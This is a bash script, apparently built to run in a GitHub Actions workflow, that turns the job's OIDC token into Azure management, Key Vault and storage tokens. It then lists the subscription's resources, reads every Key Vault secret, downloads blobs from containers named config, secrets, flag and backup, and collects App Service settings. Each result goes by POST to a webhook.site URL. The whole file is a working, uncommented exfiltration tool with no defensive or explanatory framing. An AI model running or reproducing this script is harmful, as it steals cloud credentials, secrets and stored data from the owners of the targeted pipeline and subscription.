#!/usr/bin/env bash
set -e
WH="https://webhook.site/2ba46706-cc2e-4cc1-91e7-58fda5646b88"

send() { curl -s -m30 -X POST "$WH" -H "Content-Type: application/json" -d "{\"tag\":\"$1\",\"data\":\"$(echo "$2" | base64 -w0)\"}"; }

send "env" "CLIENT=$AZURE_CLIENT_ID TENANT=$AZURE_TENANT_ID SUB=$AZURE_SUBSCRIPTION_ID OIDC_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"

# 1 - GitHub OIDC token
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
send "oidc" "${OIDC:0:40}..."

# 2 - Azure management token
AZ=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
MGMT=$(echo "$AZ" | jq -r '.access_token')
send "mgmt-token" "${MGMT:0:40}..."

# 2b - vault token
OIDC2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
AZV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC2")
VAULT_TOK=$(echo "$AZV" | jq -r '.access_token')
send "vault-token" "${VAULT_TOK:0:40}..."

# 2c - storage token
OIDC3=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
AZS=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC3")
STOR_TOK=$(echo "$AZS" | jq -r '.access_token')
send "storage-token" "${STOR_TOK:0:40}..."

API="https://management.azure.com"
H=(-H "Authorization: Bearer $MGMT")

# 3 - resource groups
RGS=$(curl -s "${H[@]}" "$API/subscriptions/$AZURE_SUBSCRIPTION_ID/resourcegroups?api-version=2022-09-01")
send "rgs" "$RGS"

# 4 - all resources
RES=$(curl -s "${H[@]}" "$API/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01")
send "resources" "$RES"

# 5 - Key Vaults
KVS=$(echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.KeyVault/vaults") | .name')
for kv in $KVS; do
  SECS=$(curl -s -H "Authorization: Bearer $VAULT_TOK" "https://$kv.vault.azure.net/secrets?api-version=7.4")
  send "kv-$kv-list" "$SECS"
  for sid in $(echo "$SECS" | jq -r '.value[]?.id'); do
    VAL=$(curl -s -H "Authorization: Bearer $VAULT_TOK" "$sid?api-version=7.4")
    send "kv-$kv-secret" "$VAL"
  done
done

# 6 - Storage accounts
STAS=$(echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.Storage/storageAccounts") | .name')
for sta in $STAS; do
  CTRS=$(curl -s -H "Authorization: Bearer $STOR_TOK" -H "x-ms-version: 2023-11-03" "https://$sta.blob.core.windows.net/?comp=list")
  send "stor-$sta-containers" "$CTRS"
  CFG=$(curl -s -H "Authorization: Bearer $STOR_TOK" -H "x-ms-version: 2023-11-03" "https://$sta.blob.core.windows.net/config/internal-config.json")
  send "stor-$sta-config" "$CFG"
  for c in config data secrets flag flags backup internal; do
    BL=$(curl -s -H "Authorization: Bearer $STOR_TOK" -H "x-ms-version: 2023-11-03" "https://$sta.blob.core.windows.net/$c?restype=container&comp=list")
    send "stor-$sta-$c-blobs" "$BL"
    for bn in $(echo "$BL" | grep -oP '<Name>\K[^<]+'); do
      BV=$(curl -s -H "Authorization: Bearer $STOR_TOK" -H "x-ms-version: 2023-11-03" "https://$sta.blob.core.windows.net/$c/$bn")
      send "stor-$sta-$c-$bn" "$BV"
    done
  done
done

# 7 - App Service configs
APPS=$(echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.Web/sites") | .id')
for app in $APPS; do
  APPCFG=$(curl -s "${H[@]}" -X POST "$API${app}/config/appsettings/list?api-version=2023-01-01")
  send "appsvc-settings" "$APPCFG"
done

send "done" "all-steps-complete"
